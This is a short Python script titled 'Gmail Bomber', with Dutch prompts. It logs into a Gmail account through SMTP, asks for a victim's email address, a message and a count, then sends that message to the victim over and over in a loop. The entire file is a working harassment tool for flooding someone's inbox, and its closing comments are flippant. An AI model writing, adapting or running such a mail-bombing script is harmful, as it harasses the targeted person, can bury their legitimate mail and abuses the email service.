#Gmail Bomber by tomvisserr01

print (''' \033[93m@tomvisserr\033[97m ''')
import smtplib
import platform
import getpass
import sys
import datetime

smtp   = raw_input(" Mail Server : ")
if smtp == 'gmail':
		server = smtplib.SMTP('smtp.gmail.com',587)
		server.starttls()

		email     = raw_input("Email : ")
		password  = getpass.getpass(" Password:")

		if not  email  and not password:
				print ("Login met je Gmail account")
		else:
				server.login(email,password)
				print ("Ingelogd")
				
				send = raw_input("Email slachtoffer : ")

				print("Nummers hoevaak je wilt spammen")
				thread= int(raw_input("Count : "))
				

				msg = raw_input("Voer je bericht in:\n")
				
				

				for count in range(int(thread)):
					server.sendmail(email,send,msg)
					print (count,"DONE ! ")



				server.quit()

else:
		print("Kies 'gmail' ")				


#No comments. Simply waste.
#What you tryna lookin here.

